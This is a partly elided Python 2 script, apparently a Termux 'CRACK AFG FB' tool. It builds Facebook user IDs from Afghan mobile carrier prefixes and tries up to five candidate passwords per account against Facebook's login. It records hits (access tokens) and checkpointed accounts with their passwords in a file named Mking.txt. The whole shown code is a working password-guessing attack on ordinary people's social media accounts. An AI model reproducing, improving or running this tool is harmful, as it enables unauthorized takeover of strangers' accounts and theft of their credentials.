...
\033[1;97m╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝/033[1;0m
\033[1;97m----------------------------------------------------------------
\033[1;91m    Author      : MAHADI HASAN AFRIDI
\033[1;91m    GitHub      : https://github.com/MAHADI-143
\033[1;91m    Facebook : Mahadi Hasan Afridi
\033[1;91m    Fb Page    : BD TERMUX TUTORIAL
\033[1;91m    Tools         : Random Afg
\033[1;97m----------------------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY MAHADI HASAN AFRIDI'
        print '\x1b[1;92m THISE SCRIPT CREATED BY MAHADI HASAN AFRIDI '
        ...
        print ''
        print '\x1b[1;93m \x1b[1;92m hutch         : \x1b[1;92m 21,91,92,93,94,96,95,97,98'
        print ''
        print '\x1b[1;93m \x1b[1;92m MTN            : \x1b[1;92m 13.72.73.74.75.76.77.78.79'
        print ''
        print '\x1b[1;93m \x1b[1;92m SALAM          : \x1b[1;92m 77.32.33.34.35.36.37.38.39'
        print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[SASI_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[SASI_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[SASI_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[SASI_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[SASI_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[SASI_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[SASI_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[SASI_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[SASI_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[SASI_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
